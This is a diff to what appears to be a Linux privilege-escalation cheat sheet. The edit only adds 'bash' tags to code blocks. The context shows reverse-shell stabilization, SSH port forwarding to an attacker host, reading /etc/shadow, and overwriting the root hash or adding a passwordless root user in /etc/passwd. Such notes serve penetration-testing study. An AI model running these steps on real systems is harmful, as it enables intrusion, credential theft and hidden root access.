@@ -145,18 +145,18 @@ echo $TERM && tput lines && tput cols
 
 Then, run commands on victim reverse shell:
 
-```
+```bash
 export SHELL=bash
 export TERM=xterm-256color
 ```
 
 Press `[Ctrl] + [z]`
 
-```
+```bash
 stty raw -echo; fg
 ```
 
-```
+```bash
 stty rows 41 columns 209
 ```
 
@@ -190,13 +190,13 @@ ss -anp
 If the ports only allow internal access, use port forwarding techniques.
 Port forwarding from victim machine (SSH server listen on attacker):
 
-```
+```bash
 ssh -f -N -R 3306:127.0.0.1:3306 kali@192.168.49.10
 ```
 
 Port forwarding from attacker machine (SSH server listen on victim):
 
-```
+```bash
 ssh -f -N -L 3306:127.0.0.1:3306 user@192.168.10.10
 ```
 
@@ -249,7 +249,7 @@ mkpasswd -m sha-512 newpassword
 
 Edit the /etc/shadow file and replace the root password hash. Finally, switch user with new password. Here is the empty password hash
 
-```
+```bash
 root:$6$1.kHoCdgGLxINgw$TQbdEgrYcctS4/o7EKtmWaxwBoOHaeU2nK4B66Any.4ksSyb5FFedubBtSs.Rc9DkxD02ju7RfK/I0U8MXdb50:17298:0:99999:7:::
 ```
 
@@ -272,7 +272,7 @@ openssl passwd newpassword
 
 Then, copy the root user row, replace username with and the "x" field with the new password to create new root user. Here is a new user with username is `lithonn` and password is empty (empty not "empty")
 
-```
+```bash
 lithonn:lF/bBdY9ikuzY:0:0:root:/root:/bin/bash
 ```
 
@@ -317,7 +317,7 @@ crontab -l
 
 Some cron process of root can not to find by listing, Use [pspy](https://github.com/DominicBreuker/pspy) to monitor process
 
-```
+```bash
 ./pspy64 -pf -i 1000
 ```
 
@@ -553,7 +553,7 @@ debugfs:  cat /etc/shadow
 !!! info
 Group adm have permissions to read log files located inside /var/log/
 
-```
+```bash
 find / -group adm 2>/dev/null | grep -v 'proc' | xargs ls -l 2>/dev/null
 ```
 
